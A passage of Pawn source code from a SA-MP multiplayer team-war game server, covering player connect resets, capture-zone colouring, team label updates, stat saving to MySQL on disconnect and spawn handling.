	 GameTextForPlayer(playerid,"~n~~n~~n~~n~ %s ",2200,3);
	 SetPlayerWeather(playerid, 1);
	 SendClientMessage(playerid,green,"Use /Help For Server Help And /Helpme To Ask From Admins.");
	 ShowPlayerBox(playerid);
	//-----
	//------
	//-------
	LastPm[playerid] = -1;
	Spectating[playerid] = 0;
	FirstSpawn[playerid] = 0;
	rconAttempts[playerid] = 0;
	PlayerInfo[playerid][Hide] = 0;


	IsPlayerCapturing[playerid][SNAKE] = 0;
	IsPlayerCapturing[playerid][BAY] = 0;
	IsPlayerCapturing[playerid][BIG] = 0;
	IsPlayerCapturing[playerid][ARMY] = 0;
	IsPlayerCapturing[playerid][PETROL] = 0;
	IsPlayerCapturing[playerid][OIL] = 0;
	IsPlayerCapturing[playerid][DESERT] = 0;
	IsPlayerCapturing[playerid][QUARRY] = 0;
	IsPlayerCapturing[playerid][GUEST] = 0;
	IsPlayerCapturing[playerid][EAR] = 0;
	IsPlayerCapturing[playerid][SUBS] = 0;


	CountVar[playerid][SNAKE] = 25;
	CountVar[playerid][BAY] = 25;
	CountVar[playerid][BIG] = 25;
	CountVar[playerid][PETROL] = 25;
	CountVar[playerid][ARMY] = 25;
	CountVar[playerid][DESERT] = 25;
	CountVar[playerid][OIL] = 25;
	CountVar[playerid][QUARRY] = 25;
	CountVar[playerid][GUEST] = 25;
	CountVar[playerid][EAR] = 25;
	CountVar[playerid][SUBS] = 25;
	
	
	grider[playerid][0] = 0;
	grider[playerid][1] = 0;
	grider[playerid][2] = 0;

	DND[playerid] = 0;
//====================================== REMOVE BUILDING FOR PLAYER ========================o
	RemoveMaps(playerid);
	
//==========================================================================================
	//-------------
	//-------------

	//----
	PlayerInfo[playerid][Jailed] = 0;
	PlayerInfo[playerid][Frozen] = 0;
	PlayerInfo[playerid][OnDuty] = 0;
	PlayerInfo[playerid][LoggedIn] = 0;
	PlayerInfo[playerid][Registered] = 0;
	PlayerInfo[playerid][God] = 0;
	PlayerInfo[playerid][GodCar] = 0;
	PlayerInfo[playerid][TimesSpawned] = 0;
	PlayerInfo[playerid][Muted] = 0;
	PlayerInfo[playerid][MuteWarnings] = 0;
	PlayerInfo[playerid][Warnings] = 0;
	PlayerInfo[playerid][Caps] = 0;
	PlayerInfo[playerid][DoorsLocked] = 0;
	PlayerInfo[playerid][pCar] = -1;
	PlayerInfo[playerid][SpamCount] = 0;
	PlayerInfo[playerid][SpamTime] = 0;
	PlayerInfo[playerid][PingCount] = 0;
	PlayerInfo[playerid][PingTime] = 0;
	PlayerInfo[playerid][FailLogin] = 0;
	PlayerInfo[playerid][blip] = 0;
	PlayerInfo[playerid][ConnectTime] = gettime();
	AntiSK[playerid] = 0;

	//------------------------------------------------------
	Attach3DTextLabelToPlayer(RankLabel[playerid], playerid, 0.0, 0.0, 0.5);
	//------------------------------------------------------
	new PlayerName[MAX_PLAYER_NAME], string[128]; //file[256];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	new tmp3[50]; GetPlayerIp(playerid,tmp3,50);
	//-----------------------------------------------------
	//-----------------------------------------------------
	//-----------------------------------------------------
/*	if(ServerInfo[NameKick] == 1) {
		for(new s = 0; s < BadNameCount; s++) {
  			if(!strcmp(BadNames[s],PlayerName,true)) {
				SendClientMessage(playerid,red, "Your Nick Is On Our Black List And You Have Been Kicked.");
				format(string,sizeof(string),"%s Has Been Kicked From RWW2 Because He Had A Forbidden Name.",PlayerName);
				SendClientMessageToAll(grey, string);  print(string);
				SaveToFile("KickLog",string);  Kick(playerid);
				return 1;
			}
		}
	}
	//-----------------------------------------------------
	if(ServerInfo[PartNameKick] == 1) {
		for(new s = 0; s < BadPartNameCount; s++) {
			new pos;
			while((pos = strfind(PlayerName,BadPartNames[s],true)) != -1) for(new i = pos, j = pos + strlen(BadPartNames[s]); i < j; i++)
			{
				SendClientMessage(playerid,red, "Your Name Isn't Allowed On This Server, You Have Been Kicked. Relog With New Name");
				SendClientMessage(playerid,red, "Relog With A New Name.");
				format(string,sizeof(string),"%s Has Been Kicked From RWW2 Because He Had A Forbidden Name.",PlayerName,playerid);
				SendClientMessageToAll(grey, string);  print(string);
				SaveToFile("KickLog",string);  Kick(playerid);
				return 1;
			}
		}
	}   */
	//-----------------------------------------------------
	if(ServerInfo[Locked] == 1) {
		PlayerInfo[playerid][AllowedIn] = false;
		SendClientMessage(playerid,red,"Server Is Currently Locked!  You have 20 seconds to enter the server password before you are kicked!");
		SendClientMessage(playerid,red," Type /password [password]");
		LockKickTimer[playerid] = SetTimerEx("AutoKick", 20000, 0, "i", playerid);
	}
	//-----------------------------------------------------
	if(strlen(dini_Get("ladmin/config/aka.txt", tmp3)) == 0) dini_Set("ladmin/config/aka.txt", tmp3, PlayerName);
 	else
	{
	    if( strfind( dini_Get("ladmin/config/aka.txt", tmp3), PlayerName, true) == -1 )
		{
		    format(string,sizeof(string),"%s,%s", dini_Get("ladmin/config/aka.txt",tmp3), PlayerName);
		    dini_Set("ladmin/config/aka.txt", tmp3, string);
		}
	}
	//-----------------------------------------------------
	/*TextDrawShowForPlayer(playerid, tBox);
	for(new line; line<15; line++)
	{
	  TextDrawShowForPlayer(playerid, Message[line]);
	}
	*/
	Streak[playerid] = 0;
	Skills[playerid] = 0;
	//------
	if(tCP[SNAKE] == TEAM_NONE) GangZoneShowForAll(Zone[SNAKE], -66);
	else if(tCP[SNAKE] == TEAM_EURASIA) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[SNAKE] == TEAM_ARAB) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[SNAKE] == TEAM_USA) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_USA_COLOR);
	else if(tCP[SNAKE] == TEAM_AUS) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_AUS_COLOR);
	else if(tCP[SNAKE] == TEAM_SOVIET) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_SOVIET_COLOR);
	else if(tCP[SNAKE] == TEAM_MARVEL) GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_MARVEL_COLOR);
	//------
	if(tCP[BAY] == TEAM_NONE) GangZoneShowForAll(Zone[BAY], -66);
	else if(tCP[BAY] == TEAM_EURASIA) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[BAY] == TEAM_ARAB) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[BAY] == TEAM_USA) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_USA_COLOR);
	else if(tCP[BAY] == TEAM_AUS) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_AUS_COLOR);
	else if(tCP[BAY] == TEAM_MARVEL) GangZoneShowForAll(Zone[BAY], TEAM_ZONE_MARVEL_COLOR);
	//------
	if(tCP[BIG] == TEAM_NONE) GangZoneShowForAll(Zone[BIG], -66);
	else if(tCP[BIG] == TEAM_EURASIA) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[BIG] == TEAM_ARAB) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[BIG] == TEAM_USA) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_USA_COLOR);
	else if(tCP[BIG] == TEAM_AUS) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_AUS_COLOR);
	else if(tCP[BIG] == TEAM_SOVIET) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_SOVIET_COLOR);
    else if(tCP[BIG] == TEAM_MARVEL) GangZoneShowForAll(Zone[BIG], TEAM_ZONE_MARVEL_COLOR);
	//------
	if(tCP[ARMY] == TEAM_NONE) GangZoneShowForAll(Zone[ARMY], -66);
	else if(tCP[ARMY] == TEAM_EURASIA) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[ARMY] == TEAM_ARAB) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[ARMY] == TEAM_USA) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_USA_COLOR);
	else if(tCP[ARMY] == TEAM_AUS) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_AUS_COLOR);
	else if(tCP[ARMY] == TEAM_SOVIET) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_SOVIET_COLOR);
	else if(tCP[ARMY] == TEAM_MARVEL) GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_MARVEL_COLOR);
	//------
	if(tCP[PETROL] == TEAM_NONE) GangZoneShowForAll(Zone[PETROL], -66);
	else if(tCP[PETROL] == TEAM_EURASIA) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[PETROL] == TEAM_ARAB) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[PETROL] == TEAM_USA) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_USA_COLOR);
	else if(tCP[PETROL] == TEAM_AUS) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_AUS_COLOR);
	else if(tCP[PETROL] == TEAM_SOVIET) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_SOVIET_COLOR);
	else if(tCP[PETROL] == TEAM_MARVEL) GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_MARVEL_COLOR);
	//------
	if(tCP[OIL] == TEAM_NONE) GangZoneShowForAll(Zone[OIL], -66);
	else if(tCP[OIL] == TEAM_EURASIA) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[OIL] == TEAM_ARAB) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[OIL] == TEAM_USA) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_USA_COLOR);
	else if(tCP[OIL] == TEAM_AUS) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_AUS_COLOR);
	else if(tCP[OIL] == TEAM_SOVIET) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_SOVIET_COLOR);
	else if(tCP[OIL] == TEAM_MARVEL) GangZoneShowForAll(Zone[OIL], TEAM_ZONE_MARVEL_COLOR);
	//------
	if(tCP[DESERT] == TEAM_NONE) GangZoneShowForAll(Zone[DESERT], -66);
	else if(tCP[DESERT] == TEAM_EURASIA) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[DESERT] == TEAM_ARAB) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[DESERT] == TEAM_USA) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_USA_COLOR);
	else if(tCP[DESERT] == TEAM_AUS) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_AUS_COLOR);
	else if(tCP[DESERT] == TEAM_SOVIET) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_SOVIET_COLOR);
	else if(tCP[DESERT] == TEAM_MARVEL) GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_MARVEL_COLOR);
	//------
	if(tCP[QUARRY] == TEAM_NONE) GangZoneShowForAll(Zone[QUARRY], -66);
	else if(tCP[QUARRY] == TEAM_EURASIA) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[QUARRY] == TEAM_ARAB) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[QUARRY] == TEAM_USA) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_USA_COLOR);
	else if(tCP[QUARRY] == TEAM_AUS) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_AUS_COLOR);
	else if(tCP[QUARRY] == TEAM_MARVEL) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_MARVEL_COLOR);
	else if(tCP[QUARRY] == TEAM_SOVIET) GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_SOVIET_COLOR);
	//------
	if(tCP[GUEST] == TEAM_NONE) GangZoneShowForAll(Zone[GUEST], -66);
	else if(tCP[GUEST] == TEAM_EURASIA) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[GUEST] == TEAM_ARAB) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[GUEST] == TEAM_USA) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_USA_COLOR);
	else if(tCP[GUEST] == TEAM_AUS) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_AUS_COLOR);
	else if(tCP[GUEST] == TEAM_SOVIET) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_SOVIET_COLOR);
    else if (tCP[GUEST]==TEAM_MARVEL) GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_MARVEL_COLOR);
	//------
	if(tCP[EAR] == TEAM_NONE) GangZoneShowForAll(Zone[EAR], -66);
	else if(tCP[EAR] == TEAM_EURASIA) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[EAR] == TEAM_ARAB) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[EAR] == TEAM_USA) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_USA_COLOR);
	else if(tCP[EAR] == TEAM_AUS) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_AUS_COLOR);
	else if(tCP[EAR] == TEAM_SOVIET) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_SOVIET_COLOR);
	else if(tCP[EAR] == TEAM_MARVEL) GangZoneShowForAll(Zone[EAR], TEAM_ZONE_MARVEL_COLOR);
	//---------------------------
	if(tCP[SUBS] == TEAM_NONE) GangZoneShowForAll(Zone[SUBS], -66);
	else if(tCP[SUBS] == TEAM_EURASIA) GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_EURASIA_COLOR);
	else if(tCP[SUBS] == TEAM_ARAB) GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_ARAB_COLOR);
	else if(tCP[SUBS] == TEAM_USA) GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_USA_COLOR);
	else if(tCP[SUBS] == TEAM_AUS) GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_AUS_COLOR);
	else if(tCP[SUBS] == TEAM_SOVIET) GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_SOVIET_COLOR);
	else if(tCP[SUBS] == TEAM_MARVEL) GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_MARVEL_COLOR);
	//-------------------------------------------
	return 1;
}
forward UpdateTextdraw(playerid);
public UpdateTextdraw(playerid)
{
   if(gTeam[playerid] == TEAM_EURASIA)
   {
      new string[150];
   	  format(string, sizeof(string),"~g~%s - ~y~%s",GetTeamName(playerid),GetClass(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_SOVIET)
   {
      new string[150];
   	  format(string, sizeof(string),"~r~%s - ~y~%s",GetTeamName(playerid),GetClass(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_ARAB)
   {
      new string[150];
   	  format(string, sizeof(string),"~y~~h~%s - ~y~%s", GetTeamName(playerid),GetClass(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_AUS)
   {
      new string[150];
   	  format(string, sizeof(string),"~p~%s - ~y~%s",GetTeamName(playerid),GetClass(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
     if(gTeam[playerid] == TEAM_MARVEL)
   {
      new string[150];
   	  format(string, sizeof(string),"~w~Vietnam- ~y~%s",GetClass(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }

   if(gTeam[playerid] == TEAM_USA)
   {
      new string[150];
   	  format(string, sizeof(string),"~b~%s - ~y~%s", GetTeamName(playerid),GetClass(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_MERC)
   {
   	  TextDrawSetString(TeamText[playerid], "~p~~h~Admin");
   }
}

public UpdateLabelText(playerid)
{
   new string[120];
   format(string, sizeof(string),"%s\n%s",GetRankName(playerid), GetClass(playerid));
   if(gTeam[playerid] == TEAM_EURASIA)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_EURASIA_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_SOVIET)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_SOVIET_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_AUS)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_AUS_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_ARAB)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_ARAB_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_USA)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_USA_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_MARVEL)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_MARVEL_COLOR, string);
   }
//   if(gTeam[playerid] == TEAM_MERC)
 //  {
//        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
//		Update3DTextLabelText(RankLabel[playerid],0x15FF00FF ,"On Duty Admin\n!!Do Not Attack!!");
//   }
   if(gTeam[playerid] == TEAM_NONE)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
   }
   return 1;
}

stock ResetEverything(playerid)
{
  IsPTBAllowed[playerid] = 1;
  return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	IsPlayerSpawned[playerid]=false;
	PlayersOnline--;
	ResetEverything(playerid);
	JetPack[playerid] = 0;
	//StealingA69Prot[playerid] = 0;  //prototype
	//++++++++++++++++++++SQL+++++++++++++++++
	if(Logged[playerid] == 1 && buggy[playerid] == 0 && reason == 1)
	{
        //If the player disconnects before registering,
        //we want to make sure it doesn't try update
        //so we check if the player is logged in.
        PlayerInfo[playerid][Level] = TempAdmin[playerid];
        new score = GetPlayerScore(playerid); //Gets players score
        new money = GetPlayerMoney(playerid); //Gets players money
        new query[200], pname[24]; //Creates the variables
        GetPlayerName(playerid, pname, 24); //Gets the players name.
       	new h, m, s; TotalGameTime(playerid, h, m, s);
//        format(query, sizeof(query), "UPDATE Accounts SET Score=%d, Cash=%d WHERE Name='%s'", score, money, pname);
//        mysql_query(query);
        format(query, sizeof(query), "UPDATE Accounts SET Score=%d, Cash=%d, Level=%d, Coins=%d, Kills=%d, Deaths=%d, Vip=%d, Kicks=%d, Bans=%d, Jails=%d, license=%d WHERE Name='%s'", score, money, PlayerInfo[playerid][Level], PlayerInfo[playerid][Helper], PlayerInfo[playerid][Kills], PlayerInfo[playerid][Deaths], PlayerInfo[playerid][dRank], h, m, s, License[playerid], pname);
        mysql_query(query);
        //No need to store a result for a update string
	}
	new byebye[100];
if(reason == 2)
{

    format(byebye,sizeof byebye,"~r~~h~[Kicked / Banned]~y~~h~%s has ~r~~h~left ~p~~h~the server!",GetName(playerid),playerid);
    SendBoxMessage(byebye);
}
else if(reason == 0)
	{
    format(byebye,sizeof byebye,"~r~~h~[CRASHED]~y~~h~%s has ~r~~h~left ~p~~h~the server!",GetName(playerid),playerid);
    SendBoxMessage(byebye);
	}
#if defined IRCENABLED
{
        new leaveMsg[128], name[MAX_PLAYER_NAME], reasonMsg[20];
        switch(reason)
        {
                case 0: reasonMsg = "Timeout";
                case 1: reasonMsg = "Leaving";
                case 2: reasonMsg = "Kicked/Banned";
        }
        GetPlayerName(playerid, name, sizeof(name));
        format(leaveMsg, sizeof(leaveMsg), "10[PART]%s (%d) Has Left The Server. -(%s)", name, playerid, reasonMsg);
        IRC_GroupSay(gGroupID, IRC_CHANNEL, leaveMsg);

}
#endif
   	if(grider[playerid][0])
   	{
    	DestroyObject(grider[playerid][0]);
    	DestroyObject(grider[playerid][1]);
    	DestroyObject(grider[playerid][2]);
    	grider[playerid][0] = 0;
	}

//    SavePlayer(playerid);
    PlayerInfo[playerid][Hide] = 0;
	TextDrawHideForPlayer(playerid, TeamText[playerid]);
    TextDrawSetString(TeamText[playerid]," ");
    TextDrawHideForPlayer(playerid, Rank1[playerid]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
	Streak[playerid] = 0;
	rconAttempts[playerid] = 0;
	LastPm[playerid] = -1;
	Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
	TextDrawHideForPlayer(playerid, Web);
    TextDrawHideForPlayer(playerid, BFB);
    TextDrawHideForPlayer(playerid, EUR);
    TextDrawHideForPlayer(playerid, A);
    TextDrawHideForPlayer(playerid, A2);
    TextDrawHideForPlayer(playerid, U);
    TextDrawHideForPlayer(playerid, S);
    TextDrawHideForPlayer(playerid, I);
	//-------------------------------------------------
 	TextDrawHideForPlayer(playerid,Textdraw0);
   	TextDrawHideForPlayer(playerid, PSTATS1);
   	TextDrawHideForPlayer(playerid, PSTATS2);
	//-----------------------------------------------------
	UpdateTimer[playerid] = KillTimer(UpdateTimer[playerid]);
	SetPVarInt(playerid,"LastID",-1);
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
//===================================================DINI DUMP BY ABHAY +++++++++++++++++++++++++++++++++
//	if(PlayerInfo[playerid][LoggedIn] == 1)	SavePlayer(playerid);
//	if(udb_Exists(PlayerName2(playerid))) dUserSetINT(PlayerName2(playerid)).("loggedin",0);

	PlayerInfo[playerid][dRank] = 0;
    PlayerInfo[playerid][Deaths] = 0;
	PlayerInfo[playerid][Kills] = 0;
	PlayerInfo[playerid][Level] = 0;
	PlayerInfo[playerid][Helper] = 0;
  	PlayerInfo[playerid][LoggedIn] = 0;
	PlayerInfo[playerid][Level] = 0;
	PlayerInfo[playerid][Jailed] = 0;
	PlayerInfo[playerid][Frozen] = 0; 
 	License[playerid] = 0;
 	TempAdmin[playerid] = 0;
 	MinigunDM[playerid] = 0;
 	buggy[playerid] = 1;

	if(PlayerInfo[playerid][Jailed] == 1) KillTimer( JailTimer[playerid] );
	if(PlayerInfo[playerid][Frozen] == 1) KillTimer( FreezeTimer[playerid] );
	if(ServerInfo[Locked] == 1)	KillTimer( LockKickTimer[playerid] );
	if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
	//==========================================================================
	if(Captured[playerid][SNAKE] == 0 && IsPlayerCapturing[playerid][SNAKE] == 1)
    {
		LeavingSnakeFarm(playerid);
	}
	if(Captured[playerid][BAY] == 0 && IsPlayerCapturing[playerid][BAY] == 1)
    {
		LeavingBay(playerid);
	}
	if(Captured[playerid][BIG] == 0 && IsPlayerCapturing[playerid][BIG] == 1)
	{
		LeavingEar(playerid);
	}
	if(Captured[playerid][ARMY] == 0 && IsPlayerCapturing[playerid][ARMY] == 1)
	{
		LeavingArmy(playerid);
	}
	if(Captured[playerid][PETROL] == 0 && IsPlayerCapturing[playerid][PETROL] == 1)
	{
		LeavingPetrol(playerid);
	}
	if(Captured[playerid][OIL] == 0 && IsPlayerCapturing[playerid][OIL] == 1)
	{
		LeavingOil(playerid);
	}
	if(Captured[playerid][DESERT] == 0 && IsPlayerCapturing[playerid][DESERT] == 1)
	{
		LeavingDesert(playerid);
	}
	if(Captured[playerid][QUARRY] == 0 && IsPlayerCapturing[playerid][QUARRY] == 1)
	{
		LeavingQuarry(playerid);
	}
	if(Captured[playerid][CITY] == 0 && IsPlayerCapturing[playerid][CITY] == 1)
	{
		LeavingCity(playerid);
	}
	if(Captured[playerid][BRIDGE] == 0 && IsPlayerCapturing[playerid][BRIDGE] == 1)
	{
		LeavingBridge(playerid);
	}
	if(Captured[playerid][CLUCKIN] == 0 && IsPlayerCapturing[playerid][CLUCKIN] == 1)
	{
		LeavingCluckin(playerid);
	}
	if(Captured[playerid][GUEST] == 0 && IsPlayerCapturing[playerid][GUEST] == 1)
	{
		LeavingGuest(playerid);
	}
	if(Captured[playerid][EAR] == 0 && IsPlayerCapturing[playerid][EAR] == 1)
	{
		LeavingEar(playerid);
	}
	if(Captured[playerid][SUBS] == 0 && IsPlayerCapturing[playerid][SUBS] == 1)
    {
		LeavingSubs(playerid);
	}
	//==========================================================================
	#if defined ENABLE_SPEC
	foreach(Player, x)
	{
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid)
   		   	AdvanceSpectate(x);
	}
	#endif
	//========clan=====
	new playername[128];
	new cfile[128];
	GetPlayerName(playerid, playername, sizeof(playername));
    format(cfile, sizeof(cfile), savefolderclan,playername);
    if(!dini_Exists(cfile))
	{
    }
    else
	{
    	dini_IntSet(cfile, "gid", group[playerid][gid]);
    	dini_IntSet(cfile, "ginvited", group[playerid][invited]);
   		dini_IntSet(cfile, "gattemptjoin",group[playerid][attemptjoin]);
   		dini_IntSet(cfile, "order",group[playerid][order]);
   	}
//    LeaveGroup(playerid, 2);

	//===================
	return 1;
}
public OnPlayerSpawn(playerid)
{
    IsPlayerSpawned[playerid]=true;
	if(MoneyGiven[playerid] != -1)
	{
		GivePlayerMoney(playerid, MoneyGiven[playerid]);
 		MoneyGiven[playerid] = -1;
	}
	SavePlayer(playerid);
	if(Synching[playerid] == true)
    {
	    Synching[playerid] = false;
	    SetPlayerHealth(playerid,sHP[playerid]);
	    SetPlayerArmour(playerid,sAP[playerid]);
	    SetPlayerPos(playerid,sPos[playerid][0],sPos[playerid][1],sPos[playerid][2]);
	    setskin(playerid);
	    SendClientMessage(playerid,green,"You Have Synced!");
	    ResetPlayerWeapons(playerid);
	    for(new slot; slot < 13; slot ++)
	    {
			GivePlayerWeapon(playerid,sWeap[playerid][slot],sAmmo[playerid][slot]);
	    }
	    return 1; // Prevent the rest of the onplayerspawn, because it's just a synchronizing isn't it?
	}
if(IsPlayerNPC(playerid))
 {
 new npcname[MAX_PLAYER_NAME];
 GetPlayerName(playerid, npcname, sizeof(npcname));
 if(!strcmp(npcname, "Oc[NPC]Bot",true))
  {
   PutPlayerInVehicle(playerid, MyFirstNPCVehicle, 0);
   }
   return 1;
 }
	if(FirstSpawn[playerid] == 1)
	{
		SendClientMessage(playerid, -1,"Please select your class");
		FirstSpawn[playerid] = 0;
		ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""ccolor"Assault - "ccolor2"Rank 0\n"ccolor"Sniper - "ccolor2"Rank 0\n"ccolor"Pilot - "ccolor2"Rank 7\n"ccolor"Engineer - "ccolor2"Rank 4\n"ccolor"JetTrooper - "ccolor2"Rank 5\n"ccolor"Support - "ccolor2"Rank 5\n"ccolor"Scout - "ccolor2"Rank 6\n"ccolor"Spy - "ccolor2"Rank 6\n"ccolor"Donor - "ccolor2"For Donators only","Select","Back");
	}

	SetPlayerHealth(playerid, 99999.0);
	SetTimerEx("SpawnProtection", 10000, false, "i", playerid);
	SendClientMessage(playerid, C_PINK, "Anti Spawn Kill Protection For 10 seconds! Leave The Base As Soon As You Can!");
//	GameTextForPlayer(playerid,"~r~PREAPARE~n~~w~TO ~y~FIGHT",4000,5);
//	GameTextForPlayer(playerid,"Use /recoverscore to recover old stats if you havent used it yet",4000,3);
	AntiSK[playerid] = 1;
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	ResetPlayerWeapons(playerid);
	GivePlayerWeapons(playerid);
	PlayerPlaySound(playerid, 1184, 2127.2194,2368.6323,10.8203); //Stop music
	Update3DTextLabelText(DM[playerid], 0xFFFFFFFF, " ");
	Update3DTextLabelText(Dis[playerid], 0xFFFFFFFF, " ");
	UpdateLabelText(playerid);
	TextDrawShowForPlayer(playerid, TeamText[playerid]);
	TextDrawHideForPlayer(playerid, CountText[playerid]);
	UpdateTextdraw(playerid);
 // rest...

     if(!IsPlayerAnimsPreloaded[playerid])
	{
   		AnimPreloadForPlayer(playerid,
		   "BOMBER");
   		AnimPreloadForPlayer(playerid,
		   "RAPPING");
    	AnimPreloadForPlayer(playerid,
			"SHOP");
   		AnimPreloadForPlayer(playerid,
		   "BEACH");
   		AnimPreloadForPlayer(playerid,
		   "SMOKING");
    	AnimPreloadForPlayer(playerid,
			"FOOD");
    	AnimPreloadForPlayer(playerid,
			"ON_LOOKERS");
    	AnimPreloadForPlayer(playerid,
			"DEALER");
		AnimPreloadForPlayer(playerid,
			"CRACK");
		AnimPreloadForPlayer(playerid,
			"CARRY");
		AnimPreloadForPlayer(playerid,
			"COP_AMBIENT");
		AnimPreloadForPlayer(playerid,
			"PARK");
		AnimPreloadForPlayer(playerid,
			"INT_HOUSE");
		AnimPreloadForPlayer(playerid,
			"FOOD");
		IsPlayerAnimsPreloaded[playerid] = 1;
	}

	if(gTeam[playerid] == TEAM_EURASIA)
	{
	   new rand = random(sizeof(EurasiaSpawn));
	   SetPlayerPos(playerid, EurasiaSpawn[rand][0], EurasiaSpawn[rand][1], EurasiaSpawn[rand][2]);
	   SetPlayerSkin(playerid, 73);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
       new rand = random(sizeof(RussiaSpawn));
